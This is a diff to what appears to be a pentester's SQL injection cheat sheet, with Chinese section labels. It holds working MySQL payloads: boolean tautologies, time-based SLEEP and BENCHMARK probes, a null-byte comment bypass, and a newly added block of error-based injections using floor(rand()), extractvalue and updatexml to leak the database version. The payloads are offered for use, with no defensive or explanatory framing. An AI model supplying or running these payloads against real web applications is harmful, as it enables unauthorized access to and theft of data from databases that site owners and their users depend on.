@@ -6,8 +6,6 @@ or 1=1- -
 ') or ('a'='a
 ) or 5290=5290 or (1232=1232
 
-
-
 mysql
 MAKE_SET(4043=4043,1)
 AND SLEEP(5)
@@ -15,7 +13,11 @@ if(now()%3dsysdate()%2csleep(3)%2c0)
 if(1,sleep(3),0)
 aaa'XOR(if(length(user())=18%2cbenchmark(8000000,md5(123))%2c0))OR'bb
 
-
-
 %00绕过
 select/*%00*/* from admin;
+
+
+mysql报错注入
+and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+and extractvalue(1,concat(0x5c,(version())));
+and 1=(updatexml(1,concat(0x3a,(version())),1))
